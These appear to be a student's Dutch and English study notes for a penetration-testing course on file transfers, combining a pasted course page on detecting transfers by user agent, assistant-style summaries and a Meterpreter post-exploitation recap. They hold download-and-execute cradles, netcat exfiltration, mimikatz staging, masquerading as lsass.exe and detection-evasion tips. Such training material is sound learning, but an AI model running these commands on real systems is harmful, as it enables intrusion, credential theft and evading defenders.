Hier is de samenvatting van hoe bestandsoverdrachten worden gespot en wat je in je **Obsidian** moet zetten.

---

## 🔍 Hoe worden File Transfers gedetecteerd?

Verdedigers kijken naar twee hoofdzaken: **Command-Line Logging** en **Network Traffic**.

### 1. User Agents (De digitale vingerafdruk)

Elke keer dat je een bestand downloadt via HTTP/S, stuurt de client een "User-Agent" string mee naar de server. Verdedigers gebruiken een SIEM (zoals Splunk of ELK) om te zoeken naar afwijkende strings.

|Tool|Standaard User-Agent|Verdacht?|
|---|---|---|
|**PowerShell**|`WindowsPowerShell/5.1...`|Ja, admin-tools downloaden zelden `.exe` bestanden.|
|**Certutil**|`Microsoft-CryptoAPI/10.0`|Zeer verdacht voor downloads.|
|**BITS**|`Microsoft BITS/7.8`|Wordt vaak door Windows Update gebruikt, maar valt op bij vreemde URL's.|
|**cURL**|`curl/7.x.x`|Vaak een directe "red flag" op Windows systemen.|

### 2. Whitelisting vs. Blacklisting

- **Blacklisting:** Het blokkeren van bekende slechte commando's (bijv. `certutil -urlcache`). Dit is makkelijk te omzeilen met hoofdlettergebruik: `CeRtUtIl -UrLcAcHe`.
    
- **Whitelisting:** De meest robuuste methode. De organisatie staat alleen specifieke commando's toe. Alles wat "raar" is, triggert een alarm.
    

---

## 🛠️ Hoe blijf je onzichtbaar? (Evasion Tips)

Als aanvalster kun je je User-Agent aanpassen om op een normale browser te lijken.

**Voorbeeld in PowerShell:**

PowerShell

```
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0" -OutFile "lsass.exe"
```

_Hierdoor lijkt je download op normaal surfgedrag van een gebruiker._

---

## 📝 Obsidian Rapport Aanvulling: "Detection & Evasion"

Markdown

```
## 🕵️ Detection & Evasion

### Indicator of Compromise (IoC)
- **Anomalous User Agents:** Zoek naar `PowerShell`, `BITS`, of `Microsoft-CryptoAPI` in web logs.
- **Process Lineage:** Een webserver (`httpd.exe` of `nginx.exe`) die plotseling `cmd.exe` of `powershell.exe` opstart.

### Evasion Technieken
1. **User-Agent Spoofing:** Verander je agent naar een standaard browser string.
2. **LOLBins:** Gebruik tools die legitiem lijken (Living off the Land).
3. **Obfuscation:** Gebruik verschillende hoofdletters of variabelen in PowerShell om simpele filters te omzeilen.
```

---

### Wat is de volgende stap?

Je hebt nu de theorie van detectie gehad. De volgende pagina is de **Skills Assessment**. Dat is de ultieme test waarbij je alles wat je hebt geleerd (Windows, Linux, Code, en LOLBins) moet combineren om een vlag te veroveren

Je bent nu bij het laatste leergedeelte voor de grote finale: **Evading Detection**. In de vorige stap zag je hoe verdedigers je kunnen spotten via User-Agents; nu leer je hoe je die filters effectief omzeilt.

Dit is de "ninja-fase" van bestandsoverdracht.

---

## 🎭 User-Agent Spoofing in PowerShell

Standaard schreeuwt PowerShell "HACKER" in de serverlogs. Maar je kunt PowerShell dwingen zich voor te doen als een normale browser.

**Hoe je de ingebouwde browsers van PowerShell opvraagt:**

PowerShell

```
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name
```

**Een bestand downloaden als Chrome:**

PowerShell

```
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

_In de logs van de verdediger lijkt dit nu op een gewone gebruiker die het internet op gaat._

---

## 🛠️ Geavanceerde LOLBins voor Evasie

Soms zijn bekende tools als `certutil` of `bitsadmin` geblokkeerd of zwaar gemonitord. Dan moet je op zoek naar obscure binaries die al op het systeem staan.

Een prachtig voorbeeld uit de tekst is `GfxDownloadWrapper.exe`. Dit is een legitiem onderdeel van Intel Graphics-drivers. Omdat het een officieel getekend bestand van Intel is, vertrouwen antivirusscanners het vaak blindelings.

**Voorbeeld:**

PowerShell

```
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\mimi.exe"
```

---

## 📝 Obsidian Rapport: "Evasion Strategy"

Markdown

```
## 🌫️ Evasion Techniques

### 1. HTTP Header Obfuscation
Gebruik altijd een legitieme User-Agent bij `Invoke-WebRequest`.
- Chrome Agent: `[Microsoft.PowerShell.Commands.PSUserAgent]::Chrome`

### 2. Trusted Binaries (LOLBAS)
Als standaard tools falen, zoek naar door de fabrikant ondertekende binaries:
- **GfxDownloadWrapper.exe** (Intel)
- **AppInstaller.exe** (Microsoft)
- Zoek meer op: [LOLBAS-Project](https://lolbas-project.github.io/)

### 3. Living off the Land (Linux)
- Gebruik **OpenSSL** of **Perl** als `wget`/`curl` gelogd worden.
- Check: [GTFOBins](https://gtfobins.github.io/)
```

---

### 🎓 Klaar voor de Skills Assessment?

Je hebt nu de hele gereedschapskist gevuld:

1. **Windows:** PowerShell, Certutil, Bitsadmin, SMB, WebDAV.
    
2. **Linux:** Wget, cURL, Python, Bash `/dev/tcp`, SCP.
    
3. **Code:** Python, PHP, Ruby, Perl oneliners.
    
4. **Security:** Encryptie met OpenSSL/AES en Evasie met User-Agents.
    

De volgende pagina is de **Skills Assessment**. Je krijgt een target en je moet al deze skills combineren om de vlaggen te bemachtigen.

**Wil je dat ik de belangrijkste "cheat sheet" commando's voor je op een rij zet voordat je aan de assessment begint?**

## 🚀 Skills Assessment Cheat Sheet

### 1. Windows (Inbound - Bestanden naar de target halen)

| **Methode**      | **Commando**                                                                                    |
| ---------------- | ----------------------------------------------------------------------------------------------- |
| **Certutil**     | `certutil.exe -urlcache -split -f http://10.10.14.x:8000/shell.exe shell.exe`                   |
| **PowerShell**   | `iwr http://10.10.14.x:8000/tool.exe -OutFile tool.exe`                                         |
| **BITS**         | `bitsadmin /transfer job /priority foreground http://10.10.14.x:8000/file.exe C:\temp\file.exe` |
| **SMB (Kali)**   | `impacket-smbserver share . -smb2support` (Op Kali)                                             |
| **SMB (Target)** | `copy \\10.10.14.x\share\file.exe .`                                                            |

  
Show more

22:27

# HTB Academy - Miscellaneous File Transfer Methods - Quick Guide

**Module:** File Transfers  
**Section:** Miscellaneous File Transfer Methods  
**Date:** 27 januari 2026

---

## 📋 Overview

Deze sectie behandelt alternatieve file transfer methoden voor situaties waarin standaard protocollen (HTTP/80, HTTPS/443, SSH/22) geblokkeerd zijn door firewalls of security policies. Deze "creative" methoden zijn essentieel voor penetration testers die in restrictieve omgevingen werken.

---

## 🔧 Method 1: Netcat - The Swiss Army Knife

### Characteristics

- ✅ **Pros:** Lightweight, fast, available on most systems
- ⚠️ **Cons:** Unencrypted traffic, easy to detect
- 📊 **Use Case:** Quick transfers in already-compromised networks

### Download to Target

**Setup Listener on Target:**

bash

```bash
nc -l -p 8000 > received_file.txt
```

**Send from Kali:**

bash

```bash
nc -w 3 [TARGET_IP] 8000 < file_to_send.txt
```

**Breakdown:**

- `-l`: Listen mode
- `-p 8000`: Port to listen on
- `-w 3`: Timeout after 3 seconds
- `>`: Redirect output to file
- `<`: Read input from file

### Upload from Target

**Setup Listener on Kali:**

bash

```bash
nc -l -p 8000 > uploaded_file.txt
```

**Send from Target:**

bash

```bash
nc [KALI_IP] 8000 < file_to_upload.txt
```

### Pro Tips

bash

```bash
# Progress indicator with pv (pipe viewer)
nc -l -p 8000 | pv > received_file.txt

# Multiple file transfer (tar on the fly)
# On receiver:
nc -l -p 8000 | tar xzvf -
# On sender:
tar czvf - /path/to/files | nc [IP] 8000

# Verify with MD5
md5sum file.txt  # Before sending
nc [IP] 8000 < file.txt
# On receiver after receiving:
md5sum file.txt  # Compare
```

---

## 🔧 Method 2: PowerShell Remoting (WinRM)

### Characteristics

- ✅ **Pros:** Encrypted, legitimate admin traffic, hard to detect
- ⚠️ **Cons:** Requires WinRM enabled (port 5985/5986), credentials needed
- 📊 **Use Case:** Windows-to-Windows transfers in enterprise environments

### Prerequisites Check

powershell

```powershell
# Check if WinRM is enabled
Test-WSMan -ComputerName [TARGET_IP]

# Enable WinRM (if you have admin rights)
Enable-PSRemoting -Force
```

### Create PowerShell Session

powershell

```powershell
# Prompt for credentials
$cred = Get-Credential

# Create session
$sess = New-PSSession -ComputerName [TARGET_IP] -Credential $cred

# Verify connection
Get-PSSession
```

### File Transfer Commands

**Copy TO Target:**

powershell

```powershell
Copy-Item -Path "C:\temp\payload.exe" -ToSession $sess -Destination "C:\Users\Public\"
```

**Copy FROM Target:**

powershell

```powershell
Copy-Item -Path "C:\Users\Public\loot.txt" -FromSession $sess -Destination "C:\local\folder\"
```

**Copy Entire Directory:**

powershell

```powershell
Copy-Item -Path "C:\tools\" -ToSession $sess -Destination "C:\temp\" -Recurse
```

### Cleanup

powershell

```powershell
# Close session
Remove-PSSession -Session $sess

# Verify closure
Get-PSSession
```

---

## 🔧 Method 3: SMB with Impacket

### Characteristics

- ✅ **Pros:** Native to Windows, blends in with normal network traffic
- ⚠️ **Cons:** Port 445 often blocked externally, requires SMBv2 support
- 📊 **Use Case:** Windows targets, internal network pivoting

### Setup on Kali

**Basic SMB Server:**

bash

```bash
# No authentication (older Windows)
sudo impacket-smbserver share -smb2support /path/to/share

# With authentication (modern Windows)
sudo impacket-smbserver share -smb2support /path/to/share -user test -password test
```

**Advanced Options:**

bash

```bash
# Custom share name
sudo impacket-smbserver MyShare -smb2support ~/tools

# Specific IP binding
sudo impacket-smbserver share -smb2support . -ip 10.10.14.114

# SMBv1 support (legacy systems)
sudo impacket-smbserver share .
```

### Windows Client Usage

**Without Authentication:**

cmd

```cmd
# List share contents
dir \\[KALI_IP]\share

# Copy file to target
copy \\[KALI_IP]\share\tool.exe C:\temp\

# Copy file from target
copy C:\sensitive\data.txt \\[KALI_IP]\share\
```

**With Authentication:**

cmd

```cmd
# Mount share as network drive
net use n: \\[KALI_IP]\share /user:test test

# Access files
dir n:\
copy n:\tool.exe C:\temp\

# Dismount when done
net use n: /delete
```

**PowerShell Alternative:**

powershell

```powershell
# Direct copy
Copy-Item \\[KALI_IP]\share\file.txt C:\temp\

# New-PSDrive (persistent)
New-PSDrive -Name "K" -PSProvider FileSystem -Root "\\[KALI_IP]\share" -Credential (Get-Credential)
```

---

## 🎯 Practical Exercise: Netcat File Transfer

### Scenario

Practice quick file transfers using Netcat between your Kali machine and a Linux target.

### Step 1: Prepare Test File on Kali

bash

```bash
┌──(kali㉿kali)-[~]
└─$ echo "HTB Academy Netcat Test - $(date)" > test_file.txt
└─$ cat test_file.txt
HTB Academy Netcat Test - Mon Jan 27 16:30:00 EST 2026
```

### Step 2: Setup Listener on Kali

bash

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444 > received_from_target.txt
Listening on 0.0.0.0 4444
```

**Command Breakdown:**

- `-l`: Listen mode
- `-v`: Verbose output
- `-n`: No DNS resolution (faster)
- `-p 4444`: Port number

### Step 3: Send from Target

bash

```bash
# SSH to target
ssh htb-student@[TARGET_IP]

# Create and send file
echo "This is from the target!" > /tmp/outgoing.txt
nc [YOUR_KALI_IP] 4444 < /tmp/outgoing.txt
```

### Step 4: Verify on Kali

bash

```bash
# Check if connection received
Connection received on [TARGET_IP] 54321

# Verify file content
┌──(kali㉿kali)-[~]
└─$ cat received_from_target.txt
This is from the target!
```

### Reverse Direction (Kali → Target)

**On Target (Listener):**

bash

```bash
nc -lvp 5555 > /tmp/received_from_kali.txt
```

**On Kali (Sender):**

bash

```bash
nc -w 3 [TARGET_IP] 5555 < test_file.txt
```

---

## 📊 Method Comparison Matrix

|Method|Protocol|Port|Encryption|Stealth|Speed|Difficulty|
|---|---|---|---|---|---|---|
|**Netcat**|TCP|Any|❌ No|🟡 Medium|⚡ Fast|⭐ Easy|
|**PS Remoting**|WinRM|5985/5986|✅ Yes|🟢 High|⚡ Fast|⭐⭐ Medium|
|**SMB**|SMB|445|⚠️ Partial|🟢 High|⚡⚡ Very Fast|⭐ Easy|
|**HTTP(S)**|HTTP(S)|80/443|⚠️ Optional|🟢 High|🐌 Medium|⭐ Easy|
|**SSH/SCP**|SSH|22|✅ Yes|🟢 High|⚡ Fast|⭐ Easy|

---

## 🛡️ Detection & Evasion

### Blue Team Detection Signatures

**Netcat Indicators:**

bash

```bash
# Monitor for nc processes
ps aux | grep nc | grep -v grep

# Check listening ports
netstat -tulpn | grep LISTEN

# Audit logs
grep nc /var/log/auth.log
```

**SMB Indicators:**

powershell

```powershell
# Windows Event ID 5140 (Network share accessed)
Get-WinEvent -FilterHashtable @{LogName='Security';ID=5140} | Select -First 10

# Monitor SMB connections
Get-SmbConnection
```

**WinRM Indicators:**

powershell

```powershell
# Event ID 4624 (Logon)
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} | Where-Object {$_.Message -like "*Logon Type:          3*"}
```

### Red Team Evasion Tips

1. **Use Non-Standard Ports**

bash

```bash
   # Instead of nc -l -p 4444
   nc -l -p 53  # DNS port (less suspicious)
   nc -l -p 443 # HTTPS port
```

2. **Encrypt Netcat Traffic**

bash

```bash
   # On receiver:
   nc -l -p 8000 | openssl enc -d -aes256 -pbkdf2 > file.txt
   
   # On sender:
   openssl enc -aes256 -pbkdf2 -in file.txt | nc [IP] 8000
```

3. **Use Legitimate Services**
    - Prefer WinRM over Netcat on Windows networks
    - SMB blends in with normal file shares
    - HTTPS uploads look like web traffic

---

## 🎓 OSCP/CPTS Relevance

### Exam Scenarios

**OSCP:**

- Netcat for quick proof.txt exfiltration
- SMB for tool staging
- May need to pivot through multiple hosts

**CPTS:**

- Demonstrates understanding of protocol stack
- Shows ability to adapt to restrictions
- Tests knowledge of Windows internals

### Quick Reference Card

bash

```bash
# ==========================================
# EMERGENCY FILE TRANSFER CHEAT SHEET
# ==========================================

# RECEIVE FILE (Listener on Kali)
nc -lvnp 4444 > received_file.txt

# SEND FILE (From Target to Kali)
nc [KALI_IP] 4444 < file_to_send.txt

# RECEIVE ON TARGET (Target listens)
nc -lvp 5555 > /tmp/tool.exe

# SEND TO TARGET (From Kali)
nc -w 3 [TARGET_IP] 5555 < tool.exe

# VERIFY INTEGRITY
md5sum file.txt  # Always check before/after!

# SMB QUICK SETUP
sudo impacket-smbserver share -smb2support .

# SMB QUICK USE (Windows)
copy \\[KALI_IP]\share\file.exe C:\temp\
```

---

## 📝 Lab Exercise Solution Template

bash

```bash
# ==========================================
# NETCAT PRACTICE LAB
# ==========================================

# 1. SETUP
echo "Test from $(hostname)" > test.txt
md5sum test.txt  # Note the hash

# 2. LISTENER (Terminal 1)
nc -lvnp 4444 > received.txt

# 3. SENDER (Terminal 2)
nc [LISTENER_IP] 4444 < test.txt

# 4. VERIFY
md5sum received.txt  # Should match original
cat received.txt
```

---

## 🔗 Additional Resources

- [Netcat Cheat Sheet](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)
- [Impacket Tools Documentation](https://github.com/fortra/impacket)
- [PowerShell Remoting Guide](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands)
- [GTFOBins - Netcat](https://gtfobins.github.io/gtfobins/nc/)

---

## ✅ Completion Checklist

To complete this section, practice:

- [ ]  Netcat listener and sender (both directions)
- [ ]  SMB server setup with Impacket
- [ ]  File copy via SMB from Windows
- [ ]  PowerShell remoting (if Windows target available)
- [ ]  Verify file integrity with MD5/SHA256
- [ ]  Type "DONE" in optional exercise

---

**Status:** 📖 Ready for practice  
**Difficulty:** ⭐⭐☆☆☆ (2/5)  
**Time Estimate:** 20-30 minutes
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

File Transfers

  

  

Page 9

Detection

  

  

  

  

  

  

Detection

Command-line detection based on blacklisting is straightforward to

bypass, even using simple case obfuscation. However, although the

process of whitelisting all command lines in a particular environment is

initially time-consuming, it is very robust and allows for quick

detection and alerting on any unusual command lines.

Most client-server protocols require the client and server to

negotiate how content will be delivered before exchanging information.

This is common with the HTTP protocol. There is a need for

interoperability amongst different web servers and web browser types to

ensure that users have the same experience no matter their browser. HTTP

clients are most readily recognized by their user agent string, which

the server uses to identify which HTTP client is connecting to it, for example, Firefox, Chrome, etc.

User agents are not only used to identify web browsers, but anything acting as an HTTP client and connecting to a web server via HTTP can have a user agent string (i.e., cURL, a custom Python script, or common tools such as sqlmap, or Nmap).

Organizations can take some steps to identify potential user agent

strings by first building a list of known legitimate user agent strings,

user agents used by default operating system processes, common user

agents used by update services such as Windows Update, and antivirus

updates, etc. These can be fed into a SIEM tool used for threat hunting

to filter out legitimate traffic and focus on anomalies that may

indicate suspicious behavior. Any suspicious-looking user agent strings

can then be further investigated to determine whether they were used to

perform malicious actions. This website is handy for identifying common user agent strings. A list of user agent strings is available here.

Malicious file transfers can also be detected by their user agents. The following user agents/headers were observed from common HTTP transfer techniques (tested on Windows 10, version 10.0.14393, with PowerShell 5).

  

Invoke-WebRequest - Client

  

Detection

  

  

PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"

PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"

  

Invoke-WebRequest - Server

  

Detection

  

  

GET /nc.exe HTTP/1.1

User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0

  

WinHttpRequest - Client

  

Detection

  

  

PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);PS C:\htb> $h.send();PS C:\htb> iex $h.ResponseText

  

WinHttpRequest - Server

  

Detection

  

  

GET /nc.exe HTTP/1.1

Connection: Keep-Alive

Accept: */*

User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)

  

Msxml2 - Client

  

Detection

  

  

PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);PS C:\htb> $h.send();PS C:\htb> iex $h.responseText

  

Msxml2 - Server

  

Detection

  

  

GET /nc.exe HTTP/1.1

Accept: */*

Accept-Language: en-us

UA-CPU: AMD64

Accept-Encoding: gzip, deflate

User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)

  

Certutil - Client

  

Detection

  

  

C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe

C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe

  

Certutil - Server

  

Detection

  

  

GET /nc.exe HTTP/1.1

Cache-Control: no-cache

Connection: Keep-Alive

Pragma: no-cache

Accept: */*

User-Agent: Microsoft-CryptoAPI/10.0

  

BITS - Client

  

Detection

  

  

PS C:\htb> Import-Module bitstransfer;PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;PS C:\htb> $r=gc $env:temp\t;PS C:\htb> rm $env:temp\t; PS C:\htb> iex $r

  

BITS - Server

  

Detection

  

  

HEAD /nc.exe HTTP/1.1

Connection: Keep-Alive

Accept: */*

Accept-Encoding: identity

User-Agent: Microsoft BITS/7.8

This section just scratches the surface on detecting malicious file

transfers. It would be an excellent start for any organization to create

a whitelist of allowed binaries or a blacklist of binaries known to be

used for malicious purposes. Furthermore, hunting for anomalous user

agent strings can be an excellent way to catch an attack in progress. We

will cover threat hunting and detection techniques in-depth in later

modules.

  

  

  

  

  

+10 Streak pts

  

  

  

  

Table of Contents

  

Introduction

File Transfer Methods

Detect or Be Detected

My Workstation

  

OFFLINE

  

  

  

  

  

/ 1 spawns left

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

Powered by  

Je bent nu bij de **Blue Team** kant van het verhaal: **Detection**. Als aanvalster is het cruciaal om te begrijpen hoe verdedigers (SOC-analisten) jouw acties zien. Als je weet hoe ze je detecteren, kun je leren hoe je onder de radar blijft.

Hier is de samenvatting van hoe bestandsoverdrachten worden gespot en wat je in je **Obsidian** moet zetten.

---

## 🔍 Hoe worden File Transfers gedetecteerd?

Verdedigers kijken naar twee hoofdzaken: **Command-Line Logging** en **Network Traffic**.

### 1. User Agents (De digitale vingerafdruk)

Elke keer dat je een bestand downloadt via HTTP/S, stuurt de client een "User-Agent" string mee naar de server. Verdedigers gebruiken een SIEM (zoals Splunk of ELK) om te zoeken naar afwijkende strings.

|Tool|Standaard User-Agent|Verdacht?|
|---|---|---|
|**PowerShell**|`WindowsPowerShell/5.1...`|Ja, admin-tools downloaden zelden `.exe` bestanden.|
|**Certutil**|`Microsoft-CryptoAPI/10.0`|Zeer verdacht voor downloads.|
|**BITS**|`Microsoft BITS/7.8`|Wordt vaak door Windows Update gebruikt, maar valt op bij vreemde URL's.|
|**cURL**|`curl/7.x.x`|Vaak een directe "red flag" op Windows systemen.|

### 2. Whitelisting vs. Blacklisting

- **Blacklisting:** Het blokkeren van bekende slechte commando's (bijv. `certutil -urlcache`). Dit is makkelijk te omzeilen met hoofdlettergebruik: `CeRtUtIl -UrLcAcHe`.
    
- **Whitelisting:** De meest robuuste methode. De organisatie staat alleen specifieke commando's toe. Alles wat "raar" is, triggert een alarm.
    

---

## 🛠️ Hoe blijf je onzichtbaar? (Evasion Tips)

Als aanvalster kun je je User-Agent aanpassen om op een normale browser te lijken.

**Voorbeeld in PowerShell:**

PowerShell

```
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0" -OutFile "lsass.exe"
```

_Hierdoor lijkt je download op normaal surfgedrag van een gebruiker._

---

## 📝 Obsidian Rapport Aanvulling: "Detection & Evasion"

Markdown

```
## 🕵️ Detection & Evasion

### Indicator of Compromise (IoC)
- **Anomalous User Agents:** Zoek naar `PowerShell`, `BITS`, of `Microsoft-CryptoAPI` in web logs.
- **Process Lineage:** Een webserver (`httpd.exe` of `nginx.exe`) die plotseling `cmd.exe` of `powershell.exe` opstart.

### Evasion Technieken
1. **User-Agent Spoofing:** Verander je agent naar een standaard browser string.
2. **LOLBins:** Gebruik tools die legitiem lijken (Living off the Land).
3. **Obfuscation:** Gebruik verschillende hoofdletters of variabelen in PowerShell om simpele filters te omzeilen.
```

---

### Wat is de volgende stap?

Je hebt nu de theorie van detectie gehad. De volgende pagina is de **Skills Assessment**. Dat is de ultieme test waarbij je alles wat je hebt geleerd (Windows, Linux, Code, en LOLBins) moet combineren om een vlag te veroveren.


Dat is een flinke brok informatie! Je hebt zojuist de handleiding voor Meterpreter doorgenomen, de absolute "gold standard" voor post-exploitation in Metasploit.

Omdat je net succesvol een Linux-machine hebt ge-pwned, is het goed om te zien hoe dit proces eruit ziet op een Windows-target. In de tekst die je stuurde, wordt een aanval op een oude Windows-server (IIS 6.0) beschreven.

Hier is de kern van wat je moet onthouden van deze pagina:
1. Wat is Meterpreter precies?

Meterpreter is geen gewone shell, maar een in-memory agent.

    Onzichtbaar: Het schrijft niets naar de harde schijf (fileless), waardoor antivirus het lastig kan vinden.

    Stabiel: Het maakt gebruik van Reflective DLL Injection om zichzelf in een draaiend proces te nestelen.

    Krachtig: Het heeft eigen commando's die veel verder gaan dan een standaard CMD of Bash prompt.

2. De Workflow (Post-Exploitation)

In je tekst zie je een klassiek scenario dat je vaak zult tegenkomen:

    Grijp de eerste shell: In het voorbeeld via een lek in WebDAV (iis_webdav_upload_asp).

    Identiteit checken: Gebruik getuid. Vaak heb je nog niet genoeg rechten (Access Denied).

    Hulp inschakelen: Gebruik de local_exploit_suggester. Dit is een geniale module die jouw sessie scant en zegt: "Hé, ik zie 5 manieren waarop je hier Admin kunt worden!"

    Privilege Escalation: Voer een van de suggesties uit (zoals ms15_051) om SYSTEM (de baas van Windows) te worden.

3. De "Loot" verzamelen

Zodra je de hoogste rechten hebt (root op Linux of SYSTEM op Windows), kun je gaan "shoppen" naar data:

    hashdump: Haalt alle wachtwoord-hashes van de machine.

    lsa_dump_secrets: Vindt wachtwoorden die in het geheugen van Windows zijn opgeslagen.

    steal_token: Hiermee kun je de identiteit van een ingelogde gebruiker stelen om verder het netwerk in te gaan (pivoting).

Belangrijk voor je volgende stappen

Let op het verschil in commando's tussen je Linux-ervaring van net en dit Windows-voorbeeld:

    Op Linux zocht je handmatig naar Sudo-lekken.

    Op Windows gebruik je vaak de local_exploit_suggester.


